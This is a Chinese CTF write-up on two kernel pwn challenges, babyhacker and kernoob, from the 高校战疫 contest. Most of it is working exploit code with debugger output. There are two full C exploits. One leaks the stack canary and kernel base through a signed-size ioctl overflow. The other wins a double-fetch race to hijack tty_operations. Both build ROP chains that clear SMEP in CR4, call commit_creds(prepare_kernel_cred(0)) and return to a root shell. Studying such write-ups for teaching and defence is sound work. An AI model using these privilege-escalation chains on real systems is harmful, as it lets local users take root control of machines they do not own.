> 原文链接: https://www.anquanke.com//post/id/200878 


# 从高校战疫的两道kernel学习kernel


                                阅读量   
                                **609147**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01d0b6e36aadd173bb.jpg)](https://p0.ssl.qhimg.com/t01d0b6e36aadd173bb.jpg)

```
这次比赛的两道kernel题，解包都可以获得flag，而且跟网上最流行的两道联系的题是如此的类似似。比赛的时候没有看，赛后复现了这两道题。
```

## 1、babykerne

### <a class="reference-link" name="go"></a>go

```
badyhacker.ko
bzImage
initramfs.cpio
startvm.sh
```

只有这四个文件，vmlinux可以从bzImage提取出来<br>
startvm.sh

```
#!/bin/bash

#stty intr ^]
#cd `dirname $0`
timeout --foreground 15 qemu-system-x86_64 
    -m 512M 
    -nographic 
    -kernel bzImage 
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' 
    -monitor /dev/null 
    -initrd initramfs.cpio 
    -smp cores=2,threads=4 
    -cpu qemu64,smep,smap 2&gt;/dev/null
```

文件开了 smep和smap 保护<br>
一个是内核不能访问用户空间的数据<br>
一个是内核不能执行用户空间的代码 // 这个可以通过修改rc4寄存器的值改变<br>
同时 也开了 kaslr 这个可以通过偏移和泄露来计算<br>
系统开了计时，只有15秒。调试的时候得去掉。

```
cpio -idmv &lt; initramfs.cpio

bin  etc   gen_cpio.sh  init            linuxrc  sbin  tmp
dev  flag  home         initramfs.cpio  proc     sys   usr
```

一般的配置文件都放 `etc/init.d` 的rcS文件

```
───────┬───────────────────────────────────────────────────────────────────────────
       │ File: rcS
───────┼───────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/sh
   2   │ 
   3   │ mount -t proc none /proc
   4   │ mount -t devtmpfs none /dev
   5   │ mkdir /dev/pts
   6   │ mount /dev/pts
   7   │ 
   8   │ insmod /home/pwn/babyhacker.ko
   9   │ chmod 644 /dev/babyhacker
  10   │ echo 0 &gt; /proc/sys/kernel/dmesg_restrict
  11   │ echo 0 &gt; /proc/sys/kernel/kptr_restrict
  12   │ 
  13   │ cd /home/pwn
  14   │ chown -R root /flag
  15   │ chmod 400 /flag
  16   │ 
  17   │ 
       │ File: rcS
───────┼───────────────────────────────────────────────────────────────────────
   1   │ #!/bin/sh
   2   │ 
   3   │ mount -t proc none /proc
   4   │ mount -t devtmpfs none /dev
   5   │ mkdir /dev/pts
   6   │ mount /dev/pts
   7   │ 
   8   │ insmod /home/pwn/babyhacker.ko
   9   │ chmod 644 /dev/babyhacker
  10   │ echo 0 &gt; /proc/sys/kernel/dmesg_restrict
  11   │ echo 0 &gt; /proc/sys/kernel/kptr_restrict
  12   │ 
  13   │ cd /home/pwn
  14   │ chown -R root /flag
  15   │ chmod 400 /flag
  16   │ 
  17   │ 
  18   │ chown -R 1000:1000 .
  19   │ setsid cttyhack setuidgid 1000 sh
  20   │ 
  21   │ umount /proc
  22   │ poweroff -f
```

容易看出系统加载了 babyhacker.ko 这个驱动<br>`kptr_restrict` 和 `dmesg_restrict` 都为0<br>
变量kptr_restrict是可以用来限制内核地址的打印，当kptr_restrict=0时，会直接打印内核地址（%p和%pK效果一样）；当kptr_restrict=1时，若在中断上下文或软中断时，%pK打印“pK-error”，否则内核地址打印全0；当kptr_restrict=2时，%pK打印内核地址为全0；<br>
dmesg能够输出kernel ring buffer中的内容，这些内容中可能会包含一些敏感信息<br>
我们可以通过设置内核参数 dmesg_restrict 为 1 的方式来禁止普通用户查看demsg信息

```
/ $ cat /proc/kallsyms | grep commit_cr
ffffffff810a1430 T commit_creds

/ $ cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff810a1820 T prepare_kernel_cred

commit_creds(prepare_kernel_cred(0))达到提权的效果
```

在babyhacker_ioctl出现bug，size改成负数，可以越界访问

```
v9 = v3;
  v5 = (signed __int16)rdx1;
  v8 = __readgsqword(0x28u);
  switch ( cmd )
  `{`
    case 0x30001u:
      read(rdx1, *(__int64 *)&amp;cmd, (unsigned __int64)rdx1, (__int64)&amp;v9);// 从用户读
      break;
    case 0x30002u:
      copy_to_user(rdx1, v4, buffersize);//写给用户
      break;
    case 0x30000u:
      if ( (signed int)rdx1 &gt;= 0xB ) # this
        v5 = 10;
      buffersize = v5;
      break;
  `}`
.text:000000000000009D                 cmp     edx, 0Bh
.text:00000000000000A0                 mov     eax, 0Ah
.text:00000000000000A5                 cmovge  edi, eax
.text:00000000000000A8                 mov     cs:buffersize, di //16位的
.text:00000000000000AF                 jmp     short loc_8A
```

说明负数后面的的两个字节是决定size

读写都有了，然后又可以越界，那是不是可以rop了。真爽！



### <a class="reference-link" name="%E8%B0%83%E8%AF%95"></a>调试

先把 kaslr关了<br>
找打驱动加载的基地址

```
/ $ lsmod
babyhacker 2104 0 - Live 0xffffffffc0000000 (OE)
```

先构造 size，看看canary在哪个位置

```
save_status();
    int fd = open("/dev/babyhacker",2);
    if(fd &lt; 0)`{`
        puts("fd error");
        exit(0);
    `}`
    getchar();
    ioctl(fd,0x30000,0x80000100);
    size_t buf[0x1000];
    ioctl(fd,0x30002,buf);
    size_t * buf_c = (size_t *)buf;
    for(int i = 0;i&lt;0x50;i++)`{`
        printf("idx:%d value:0x%lxn",i,buf_c[i]);
    `}`
```

在调试的时候可以getchar()截住下面程序，让程序进入等待状态

```
idx:0 value:0xffffc90000135288
idx:1 value:0xffff88001db1a980
idx:2 value:0xffff88001d4e6200
idx:3 value:0xffff88001db15cd8
idx:4 value:0x24280ca
idx:5 value:0x0
idx:6 value:0x7fffffffffffffff
idx:7 value:0xfff
idx:8 value:0xe11d5dc4776f2cbf
idx:9 value:0x943891
idx:10 value:0x0
idx:11 value:0xffff88001db1a980
idx:12 value:0xffffffff810c31d0
idx:13 value:0xdead000000000100
idx:14 value:0xdead000000000200
idx:15 value:0xe11d5dc4776f2cbf
idx:16 value:0xffff88001db15c00
idx:17 value:0xfffffffffffffffb
idx:18 value:0xffff88001e3b21a8
idx:19 value:0xffff88001d4e6200
idx:20 value:0xffffffff814e5716
idx:21 value:0xffff88001d4e3e40
idx:22 value:0xffffffff814dd676
idx:23 value:0xffff88001e059350
idx:24 value:0x943890
idx:25 value:0xffff88001d4e6200
idx:26 value:0xffff88001d4e3f18
```

随便找个断点下，能断下就OK

```
└─[0] &lt;&gt; gdb vmlinux 
pwndbg: loaded 180 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from vmlinux...(no debugging symbols found)...done.
pwndbg&gt; add-symbol-file ./
.gdb_history    bzImage         initramfs.cpio  startvm.sh      
babyhacker.ko   core/           rop.txt         vmlinux         
pwndbg&gt; add-symbol-file ./
.gdb_history    bzImage         initramfs.cpio  startvm.sh      
babyhacker.ko   core/           rop.txt         vmlinux         
pwndbg&gt; add-symbol-file babyhacker.ko 0xffffffffc0000000
add symbol table from file "babyhacker.ko" at
    .text_addr = 0xffffffffc0000000
Reading symbols from babyhacker.ko...done.
pwndbg&gt; b *0xffffffffc0000000+0x35
Breakpoint 1 at 0xffffffffc0000035: file /home/zoe/Desktop/kernel_pwn/myko/babyhacker.c, line 50.
pwndbg&gt; target remote :1234


RBP  0xffff88001d4e3d40 ◂— 0
RSP  0xffff88001d4e3bf8 ◂— 0

pwndbg&gt; x/20xg 0xffff88001d4e3d40-0x8
0xffff88001d4e3d38:    0xe11d5dc4776f2cbf    0x0000000000000000
可以看出 0xe11d5dc4776f2cbf 找个就是 canary
然后 可以利用其它的内核地址就可以 得出offset 就用绕过kaslr
```

既然知道 canary，下面就是找出偏移

```
.text:00000000000000B8                 lea     cmd, [rbp-148h]
.text:00000000000000BF                 call    _copy_to_user
所以整个数组大小应该是140byte
rbp前面就是canary
```



### <a class="reference-link" name="exp%E7%BC%96%E5%86%99"></a>exp编写

做内核题，一般少不了对程序状态的保存<br>
因为在用户空间返回内核空间的是时候要恢复状态，就有点像中断进入内核，然后保存状态。出来再把状态恢复。<br>
因为要改rc4，肯定少不了 `pop rdi; ret;`和`mov cr4, rdi; pop rbp; ret;` 这两条执行。

从用户空间回到内核空间需要 `swapgs` 和 `iretq`<br>
具体流程就是：<br>
修改size<br>
读取数据找到cananry和offset<br>
写rop<br>
exp

```
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ioctl.h&gt;
typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds =0xffffffff810a1430;
_prepare_kernel_cred prepare_kernel_cred =0xffffffff810a1820;
void get_shell()`{`
    if(!getuid())`{`
        printf("suceessn");
        system("/bin/sh");
    `}`
    else`{`
        puts("get shell fail");
    `}`
    exit(0);
`}`


size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()`{`
    __asm__(
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags"
    );
    printf("[*] status has been savedn");
`}`
size_t pop_rdi = 0xffffffff8109054d,pop_rdx =0xffffffff81083f22;
size_t pop_rcx = 0xffffffff81006ffc,mov_rc4_pop_ret = 0xffffffff81004d70;
size_t swapgs = 0xffffffff810636b4,iretq_ret = 0xffffffff81478294;
void get_root()
`{`
    commit_creds(prepare_kernel_cred(0));

`}`
void main()`{`
    save_status();
    int fd = open("/dev/babyhacker",O_RDONLY);
    if(fd &lt; 0)`{`
        puts("fd error");
        exit(0);
    `}`
    getchar();
    ioctl(fd,0x30000,0x80000100);
    size_t buf[0x1000];
    ioctl(fd,0x30002,buf);
    size_t * buf_c = (size_t *)buf;
    for(int i = 0;i&lt;0x50;i++)`{`
        printf("idx:%d value:0x%lxn",i,buf_c[i]);
    `}`
    size_t canary = buf_c[8];
    size_t offset = 0xffffffff810c31d0 -  buf_c[12];
    printf("[*]canary:0x%lxn",canary);
    commit_creds += offset;
    prepare_kernel_cred += offset;
    pop_rdi +=offset;
    iretq_ret += offset;
    mov_rc4_pop_ret += offset;
    printf("[*] commit_cred: 0x%lxn",commit_creds);
    printf("[*] prepare_kernel_cred : 0x%lxn",prepare_kernel_cred);
    ioctl(fd,0x30000,0x80001000);
    size_t rop[0x100]=`{`0`}`;
    int i=40;
    rop[i++] = canary;
    rop[i++] = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0x6f0;
    rop[i++] = mov_rc4_pop_ret;
    rop[i++] = 0;
    rop[i++] = (size_t)get_root;
    rop[i++] = swapgs;
    rop[i++] = 0;
    rop[i++] = iretq_ret;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    ioctl(fd,0x30001,rop);
    //rop[i++] = 

`}`
```

```
[*]canary:0x8e9280f76a472054
[*] commit_cred: 0xffffffff810a1430
[*] prepare_kernel_cred : 0xffffffff810a1820
suceess
/home/pwn # id
uid=0(root) gid=0
/home/pwn #
```



## 2.kernoob

#### <a class="reference-link" name="go"></a>go

```
bzImage
initramfs.cpio
noob.ko
startvm.sh
```

startvm.sh

```
stty intr ^]
cd `dirname $0`
timeout --foreground 600 qemu-system-x86_64 
    -m 128M 
    -nographic 
    -kernel bzImage 
    -append 'console=ttyS0 loglevel=3 pti=off oops=panic panic=1 nokaslr' 
    -monitor /dev/null 
    -initrd initramfs.cpio 
    -smp 2,cores=2,threads=1 
    -cpu qemu64,smep 2&gt;/dev/null
```

开了smep，没开nokaslr<br>
smep 只有改cr4就可以绕过<br>
比赛的时候有个师傅说是double fetch，然后我就想不出是哪里double fetch，后来看到一位师傅的博客讲到三种情况的 double fetch<br>
下面引用师傅说的

```
1、Shallow Copy
这种数据传递通常是结构体类型的变量传递，结构体中包含了指针，当把这个数据传递进内核时，只是得到了结构体的数据，也就是浅拷贝，如果对结构体中的指针验证过后使用之前，恶意线程修改了这个指针，便是绕过了验证
2、Type Selection
第一次传递根据header决定数据类型，根据不同类型来接受第二次传递，在这之间修改了数据，则造成数据与类型不匹配，如cxgb3 main.c中的一段代码
3、Size Checking
第一次传递根据header获取size，申请对应大小的buf，第二次传递接受数据存入buf
 for     ----Mask 师傅
```

这次比赛的类型就是就跟第三种类似

```
1 #!/bin/sh
  2 
  3 echo "Welcome :)"
  4 
  5 mount -t proc none /proc
  6 mount -t devtmpfs none /dev
  7 mkdir /dev/pts
  8 mount /dev/pts
  9 
 10 insmod /home/pwn/noob.ko
 11 chmod 666 /dev/noob
 12 
 13 echo 0 &gt; /proc/sys/kernel/dmesg_restrict
 14 echo 0 &gt; /proc/sys/kernel/kptr_restrict
 15 
 16 cd /home/pwn
 17 setsid /bin/cttyhack setuidgid 0 sh
 18 
 19 umount /proc
 20 poweroff -f
```

内核加载了noob.ko驱动

```
signed __int64 __usercall add_note@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;, unsigned __int64 *a2@&lt;rdi&gt;)
`{`
  unsigned __int64 v3; // [rsp-20h] [rbp-20h]
  __int64 v4; // [rsp-18h] [rbp-18h]

  _fentry__(a2);
  v3 = *a2;
  if ( a2[2] &gt; 0x70 || a2[2] &lt;= 0x1F )
    return -1LL;
  if ( v3 &gt; 0x1F || *((_QWORD *)&amp;pool + 2 * v3) )
    return -1LL;
  v4 = _kmalloc(a2[2], 0x14000C0LL);
  if ( !v4 )
    return -1LL;
  *((_QWORD *)&amp;pool + 2 * v3) = v4;
  qword_BC8[2 * v3] = a2[2];
  return 0LL;
`}`
```

这里在判断 size 和分配size是分开来判断的,如果这时候判断size完了，然后有另一个线程出现，然后修改<br>
size，那是不是就可以分配到我们想要分配到的size，在kernel中存在一种tty_struct结构，大小是0x2e0。<br>
利用有个 tty_operations 结构体，利用来很多函数，这也许就是传说中的风水地。<br>
如果能修改其中一个或者劫持掉，那岂不是可以执行rop了<br>
但是执行rop需要在知道栈的地址，那我们是不是可以先mmap一个可以执行内存，然后跳到这里来。<br>
劫持 函数的时候要 利用寄存器中的值，和esp的值来实现<br>
然后 需要把rop复制到开辟的栈上<br>
然后smep 跟上面一样<br>
然后就是getshell



### <a class="reference-link" name="%E8%B0%83%E8%AF%95"></a>调试

```
/home/pwn # lsmod
noob 16384 0 - Live 0xffffffffc0002000 (OE)
```

首先，先malloc到我们想要的size的chunk

```
char *buf2 = (char*) malloc(0x1000);
    save_status();
    buf[0] = 0x0;
    int fd  = open("/dev/noob",O_RDONLY);
    pthread_t t1;
    pthread_create(&amp;t1,NULL,change,&amp;buf[2]);
    buf[0]=0;
    buf[2]=0x0;
    for(int i=0;i&lt;0x100000;i++)
    `{`   
        buf[2] = 0;
        ioctl(fd,0x30000,buf);
    `}`
    fff=0;
    pthread_join(t1,NULL);
    ioctl(fd,0x30001,buf);
```

然后就能malloc到 我们想要的chunk

```
pwndbg&gt; x/20xg 0xffffffffc00044c0
0xffffffffc00044c0:    0xffff8800058a6c00    0x00000000000002e0
0xffffffffc00044d0:    0x0000000000000000    0x0000000000000000
```

那之后就是伪造 tty_operations

```
struct tty_operations
`{`
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
`}`;
```

修改ioctl 为我们的转移栈的地址 我们可以利用xchg eax，esp

```
RAX  0xffffffff8101db17 ◂— xchg   eax, esp /* 0x63be0025394cc394 */
 RBX  0x0
 RCX  0x6e23a0 ◂— 0
 RDX  0x0
 RDI  0xffff8800058a6c00 ◂— add    dword ptr [rax + rax], edx /* 0x100005401 */
 RSI  0x0
 R8   0x0
 R9   0xffffabf2
 R10  0x0
 R11  0x0
 R12  0xffff8800058a6c00 ◂— add    dword ptr [rax + rax], edx /* 0x100005401 */
 R13  0x0
 R14  0xffff880005874c00 ◂— 0
 R15  0xffff8800058a6400 ◂— add    dword ptr [rax + rax], edx /* 0x100005401 */
 RBP  0xffffc9000024fe60 —▸ 0xffffc9000024fee8 —▸ 0xffffc9000024ff28 —▸ 0xffffc9000024ff48 ◂— 0
 RSP  0xffffc9000024fdb0 —▸ 0xffffffff815d0786 ◂— 0xae850ffffffdfd3d
 RIP  0xffffffff8101db17 ◂— xchg   eax, esp /* 0x63be0025394cc394 */
```

然后就将栈转移到了 0x8101db17

```
00:0000│ rsp  0x8101db17 —▸ 0xffffffff813f6c9d ◂— pop    rdi /* 0x40478b480080c35f */
01:0008│      0x8101db1f ◂— 0x6f0
02:0010│      0x8101db27 —▸ 0xffffffff81069b14 ◂— 0x801f0fc35de7220f
03:0018│      0x8101db2f ◂— 0
04:0020│      0x8101db37 —▸ 0x400a4c ◂— 0xec834853e5894855
05:0028│      0x8101db3f ◂— 0


   0xffffffff8101db17    xchg   eax, esp
 ► 0xffffffff8101db18    ret    &lt;0xffffffff813f6c9d&gt;
    ↓
   0xffffffff813f6c9d    pop    rdi
   0xffffffff813f6c9e    ret    
    ↓
   0xffffffff81069b14    mov    cr4, rdi
   0xffffffff81069b17    pop    rbp
   0xffffffff81069b18    ret    
    ↓
   0x400a4c              push   rbp
   0x400a4d              mov    rbp, rsp
   0x400a50              push   rbx
   0x400a51              sub    rsp, 8
```

剩下就跟上面差不多就是写rop，绕过smep，再执行commit_creds(prepare_kernel_cred(0)); 然后getshell<br>
exp

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;poll.h&gt;
#include &lt;pthread.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;pthread.h&gt;
#include &lt;stdint.h&gt;
#define _GNU_SOURCE
#include &lt;string.h&gt;
#include &lt;sched.h&gt;
#include &lt;pty.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/ipc.h&gt;
#include &lt;sys/sem.h&gt;
//#define commit_cred  0xffffffff810a1430
//#define prepare_kernel_cred  0xffffffff810a1820
typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
int spray_fd[0x100];
size_t buf[3] =`{`0`}`;
struct tty_operations
`{`
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
`}`;
void get_shell()`{`
    system("sh");
    exit(0);
`}`
struct tty_operations fake_ops;
int fff = 1;
char fake_procfops[1024];
size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;
void save_status()
`{`
    __asm__(
    "mov %%cs, %0n"
    "mov %%ss,%1n"
    "mov %%rsp,%2n"
    "pushfqn"
    "pop %3n"
    "mov %%gs,%4n"
    "mov %%es,%5n"
    "mov %%fs,%6n"
    "mov %%ds,%7n"  
    ::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
    );
    puts("[*]status has been saved.");
`}`
/*
void get_root()
`{`
    void * (*pkc)(int) = (void *(*)(int))prepare_kernel_cred;
    void (*cc)(void *) = (void (*)(void * ))commit_cred;
    (*cc)((*pkc)(0));
`}`
*/
void change(size_t*a)`{`
    while(fff==1)`{`
        *a=0x2e0;
    `}`

`}`
   _commit_creds commit_creds=0xffffffff810ad430;
    _prepare_kernel_cred prepare_kernel_cred=0xffffffff810ad7e0;
//cd ./core/tmp &amp;&amp; gcc exp.c -pthread --static  -g -o exp &amp;&amp; cd .. &amp;&amp; ./gen_cpio.sh initramfs.cpio &amp;&amp; cd .. &amp;&amp; ./startvm.sh
void sudo()`{`
    commit_creds(prepare_kernel_cred(0));
    asm(
        "push %0n"
        "push %1n"
        "push %2n"
        "push %3n"
        "push %4n"
        "push $0n"
        "swapgsn"
        "pop %%rbpn"
        "iretqn"    
        ::"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_cs),"a"(&amp;get_shell)    
        );
`}`
void main()`{`
    char *buf2 = (char*) malloc(0x1000);
    save_status();

    buf[0] = 0x0;
    int fd  = open("/dev/noob",O_RDONLY);
    pthread_t t1;
    pthread_create(&amp;t1,NULL,change,&amp;buf[2]);
    buf[0]=0;
    buf[2]=0x0;
    for(int i=0;i&lt;0x100000;i++)
    `{`   buf[2] = 0;
        ioctl(fd,0x30000,buf);
    `}`
    fff=0;
    pthread_join(t1,NULL);
    ioctl(fd,0x30001,buf);
    /*close(fd);
    int pid = fork();
    if(pid &lt; 0)`{`
        puts("fork error");
    `}`
    else if(pid==0)`{`
        char zeros[30] = `{`0`}`;
        buf[2] = 28;
        buf[1] = (size_t) zeros;
        ioctl(fd2,0x30002,buf);
        if(getuid==0)`{`
            puts("[+] root now.");
            system("/bin/sh");
            exit(0);
        `}`
        else`{`
            puts("[*]fail");
            exit(0);
        `}`

    `}`
    else`{`
        wait(NULL);
    `}`
    */
   size_t xchgeaxesp=0xffffffff8101db17;;//0xffffffff81007808;
   size_t fake_stack=xchgeaxesp&amp;0xffffffff;  

   if(mmap((void*)(fake_stack&amp;0xfffff000), 0x3000, 7, 0x22, -1, 0)!=(fake_stack&amp;0xfffff000))`{` //这里是mmap地址
       perror("mmap");
       exit(1);
   `}`
    size_t rop[] = 
    `{`
        0xffffffff813f6c9d,     // pop rdi; ret;
        0x6f0,                  // cr4 with smep disabled
        0xffffffff81069b14,     // mov cr4, rdi; ret;
        0x0,
        (size_t) sudo
    `}`;
    memset(&amp;fake_ops, 0, sizeof(fake_ops));//把rop写栈中
    memset(fake_procfops, 0, sizeof(fake_procfops));
    fake_ops.proc_fops = &amp;fake_procfops;
    fake_ops.ioctl = xchgeaxesp;

    memcpy((void*)fake_stack, rop, sizeof(rop));
    size_t buf_e[0x20/8] = `{`0`}`;
    for (int i =0;i&lt;0x100;i++)`{`
        spray_fd[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
        if(spray_fd[i]&lt;0)`{`
            perror("open tty");
        `}`
    `}`
    puts("[+] Reading buffer content from kernel buffer");
    buf[0]=0;
    buf[1]=(size_t)buf_e;
    buf[2]=0x20;
    ioctl(fd, 0x30003, buf);
    buf_e[3] = (size_t) &amp;fake_ops;
    for(int i =0;i&lt;4;i++)`{`
        printf("%lxn",buf_e[i]);
    `}`
    ioctl(fd, 0x30002, buf);
    getchar();
    for(int i =0;i&lt;0x100;i++)`{`
        ioctl(spray_fd[i],0,0);
    `}`

`}`
```

```
Welcome :)
~ $ id
uid=1000(pwn) gid=1000 groups=1000
~ $ /tmp/exp
exp      exp.c    exp1.c   expliot
~ $ /tmp/expliot 
[*]status has been saved.
[+] Reading buffer content from kernel buffer
100005401
0
ffff88000620f0c0
6e23a0
/home/pwn # id
uid=0(root) gid=0
/home/pwn #
```

补充：

```
ptmx设备是tty设备的一种,open函数被tty核心调用, 当一个用户对这个tty驱动被分配的设备节点调用open时tty核心使用一个指向分配给这个设备的tty_struct结构的指针调用它,也就是说我们在调用了open函数了之后会创建一个`tty_struct`结构体,然而最关键的是这个tty_struct也是通过kmalloc申请出来的一个堆空间
for --钞sir师傅
```

这次比赛的kernel还是用到最常见的uaf，越界访问。足以看出其实kernel pwn和用户态的pwn 利用点是差不多的，主要是在利用方式。kernel pwn有很多可以利用的结构体之类的数据结构，也涉及到了进程和线程间通信的问题。往往比较复杂。<br>
最后一道还有可以修复modprobe_path指向一个错误的二进制文件进行getshell。<br>
感谢 peanuts师傅的指导

## 参考链接

[dmesg_restrict](http://blog.lujun9972.win/blog/2018/08/03/%E5%A6%82%E4%BD%95%E7%A6%81%E6%AD%A2%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9F%A5%E7%9C%8Bdmesg%E4%BF%A1%E6%81%AF/index.html)<br>[kptr_restrict](https://blog.csdn.net/flyingnosky/article/details/97407811)<br>[double fetch](http://mask6asok.top/2020/02/06/Linux_Kernel_Pwn_4.html)<br>[一道简单内核题入门内核利用](https://www.anquanke.com/post/id/86490)<br>[绕过smep](https://xz.aliyun.com/t/5847)
